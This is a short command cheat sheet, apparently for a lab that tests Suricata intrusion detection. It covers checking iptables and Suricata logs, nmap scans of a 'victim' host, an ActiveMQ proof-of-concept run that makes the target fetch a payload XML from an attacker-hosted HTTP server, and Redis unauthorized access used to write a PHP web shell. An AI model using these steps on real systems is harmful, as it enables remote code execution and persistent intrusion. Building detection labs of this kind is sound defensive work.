# Help

### Проверить iptables:
```bash
sudo iptables -L DOCKER-USER -nv --line-numbers
```

### Проверить Логи Suricata:
```bash
journalctl -u suricata.service -b
sudo tail -n 200 /var/log/suricata/suricata.log
sudo tail -n 0 -f /var/log/suricata/fast.log
sudo tail -n 0 -f /var/log/suricata/eve.json | jq .
```

### Запустить Suricata вручную:
```bash
sudo suricata -c /etc/suricata/suricata.yaml -q 0
```

### NMAP scans:
```bash
nmap -sS victim     # SYN scan
nmap -sX victim     # Xmas scan
nmap -sU victim     # UDP scan
nmap -O victim      # OS detection
```

### ActiveMQ
```bash
nmap -sV -p 61616,8161 172.20.0.101
curl -I http://172.20.0.101:8161/
cd /opt
python3 -m http.server 8888
python3 poc.py -i 172.20.0.101 -p 61616 -u http://172.20.0.10:8888/poc.xml
```

### Redis Unauthorized Access + Command Execution
```bash
nmap -sV -p 6379 172.20.0.102
redis-cli -h 172.20.0.102 ping
redis-cli -h 172.20.0.102
>>> info server
>>> config get "*"
>>> keys *
>>> dbsize
>>> config set dir /tmp
>>> config set dbfilename webshell.php
>>> set test "<?php system($_GET['cmd']); ?>"
>>> save
```